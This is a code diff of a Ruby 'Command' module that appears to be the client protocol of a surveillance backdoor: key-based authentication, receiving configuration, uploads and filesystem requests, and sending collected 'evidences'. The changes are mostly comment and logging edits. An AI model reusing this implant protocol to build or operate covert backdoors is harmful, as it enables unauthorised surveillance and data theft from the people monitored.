@@ -43,9 +43,9 @@ module Command
   def authenticate(backdoor)
     trace :info, "AUTH"
      
-    # first part of the session key, choosen by the client
-    # it will be used to derive the session key later along with Ks (server choosen)
-    # and the Cb (preshared conf key)
+    # first part of the session key, chosen by the client
+    # it will be used to derive the session key later along with Ks (server chosen)
+    # and the Cb (pre-shared conf key)
     kd = SecureRandom.random_bytes(16)
     trace :debug, "Auth -- Kd: " << kd.unpack('H*').to_s
     
@@ -62,7 +62,7 @@ module Command
     
     # backdoor identification
     # the server will calculate the same sha digest and authenticate the backdoor
-    # since the conf key is preshared
+    # since the conf key is pre-shared
     sha = Digest::SHA1.digest(rcs_id + backdoor.instance + rcs_type + backdoor.conf_key)
     trace :debug, "Auth -- sha: " << sha.unpack('H*').to_s
     
@@ -117,7 +117,7 @@ module Command
 
 
   # ->  Crypt_K ( PROTO_ID  [Version, UserId, DeviceId, SourceId] )
-  # <-  Crypt_K ( PROTO_OK, Availables )
+  # <-  Crypt_K ( PROTO_OK, Time, Availables )
   def send_id(backdoor)
     trace :info, "ID"
      
@@ -147,7 +147,7 @@ module Command
       trace :debug, "ID -- Server Time : " + time.to_s
       trace :debug, "ID -- Local  Time : " + Time.new.to_i.to_s + " diff [#{diff_time}]"
       if size != 0 then
-        trace :debug, "ID -- available: " + list.to_s
+        trace :debug, "ID -- available(#{size}): " + list.to_s
         available = list
       end
     else
@@ -158,7 +158,8 @@ module Command
     return available
   end
   
-  
+
+  # Protocol Conf
   # ->  Crypt_K ( PROTO_CONF )
   # <-  Crypt_K ( PROTO_NO | PROTO_OK [ Conf ] )
   def receive_config(backdoor)
@@ -177,7 +178,7 @@ module Command
     end
   end
   
-  
+  # Protocol Upload
   # ->  Crypt_K ( PROTO_UPLOAD )
   # <-  Crypt_K ( PROTO_NO | PROTO_OK [ left, filename, content ] )  
   def receive_uploads
@@ -221,7 +222,8 @@ module Command
       trace :info, "DOWNLOAD -- No downloads for me"
     end
   end
-  
+
+  # Protocol Filesystem
   # ->  Crypt_K ( PROTO_FILESYSTEM )   
   # <-  Crypt_K ( PROTO_NO | PROTO_OK [ numElem,[ depth1, dir1, depth2, dir2, ... ]] )
   def receive_filesystems
@@ -252,8 +254,8 @@ module Command
   end
   
   
-  # Protocol Log
-  # ->  Crypt_K ( PROTO_LOG [ size, content ] )   
+  # Protocol Evidence
+  # ->  Crypt_K ( PROTO_EVIDENCE [ size, content ] )
   # <-  Crypt_K ( PROTO_OK | PROTO_NO )   
   def send_evidences(evidences)
 
